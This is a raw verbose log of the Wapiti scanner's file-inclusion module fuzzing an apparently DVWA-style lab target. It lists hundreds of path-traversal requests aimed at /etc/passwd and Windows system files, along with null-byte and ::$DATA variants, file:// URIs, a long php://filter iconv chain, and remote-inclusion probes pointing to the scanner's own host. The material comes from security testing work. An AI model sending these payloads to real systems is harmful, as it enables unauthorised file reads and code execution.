2024-03-20 12:44:16.862 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=%2Fetc%2Fservices (0)
2024-03-20 12:44:16.871 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=%2Fetc%2Fservices%00 (0)
2024-03-20 12:44:16.880 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-20 12:44:16.890 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00 (0)
2024-03-20 12:44:16.899 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA (0)
2024-03-20 12:44:16.909 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 12:44:16.918 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 12:44:16.928 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA (0)
2024-03-20 12:44:16.936 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F (0)
2024-03-20 12:44:16.946 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F (0)
2024-03-20 12:44:16.957 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 12:44:16.967 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 12:44:16.976 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 12:44:16.986 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 12:44:16.995 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 12:44:17.004 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 12:44:17.015 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 12:44:17.024 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 12:44:17.035 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 12:44:17.045 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 12:44:17.054 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 12:44:17.064 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 12:44:17.074 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp (0)
2024-03-20 12:44:17.087 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 12:44:17.100 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 12:44:17.111 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 12:44:17.121 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 12:44:17.135 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 12:44:17.146 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 12:44:17.155 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 12:44:17.167 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 12:44:17.177 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 12:44:17.188 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 12:44:17.200 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 12:44:17.211 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 12:44:17.220 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 12:44:17.230 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 12:44:17.239 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 12:44:17.249 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 12:44:17.258 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 12:44:17.268 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 12:44:17.277 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 12:44:17.286 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 12:44:17.296 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 12:44:17.305 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 12:44:17.314 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 12:44:17.323 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 12:44:17.333 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=file%3A%2F%2F%2Fetc%2Fpasswd (0)
2024-03-20 12:44:17.342 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-20 12:44:17.351 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd (0)
2024-03-20 12:44:17.362 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00 (0)
2024-03-20 12:44:17.372 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices (0)
2024-03-20 12:44:17.383 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00 (0)
2024-03-20 12:44:17.394 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 12:44:17.403 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 12:44:17.424 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit (1)
2024-03-20 12:44:17.428 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (1)
2024-03-20 12:44:17.437 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (1)
2024-03-20 12:44:17.448 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=%2Fetc%2Fpasswd (1)
2024-03-20 12:44:17.459 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=%2Fetc%2Fpasswd%00 (1)
2024-03-20 12:44:17.469 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=%2Fetc%2Fservices (1)
2024-03-20 12:44:17.480 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=%2Fetc%2Fservices%00 (1)
2024-03-20 12:44:17.489 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (1)
2024-03-20 12:44:17.499 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00 (1)
2024-03-20 12:44:17.509 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA (1)
2024-03-20 12:44:17.517 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
2024-03-20 12:44:17.527 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
2024-03-20 12:44:17.536 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA (1)
2024-03-20 12:44:17.546 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F (1)
2024-03-20 12:44:17.555 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F (1)
2024-03-20 12:44:17.566 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (1)
2024-03-20 12:44:17.576 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (1)
2024-03-20 12:44:17.585 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (1)
2024-03-20 12:44:17.596 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (1)
2024-03-20 12:44:17.604 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (1)
2024-03-20 12:44:17.614 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (1)
2024-03-20 12:44:17.624 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (1)
2024-03-20 12:44:17.637 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (1)
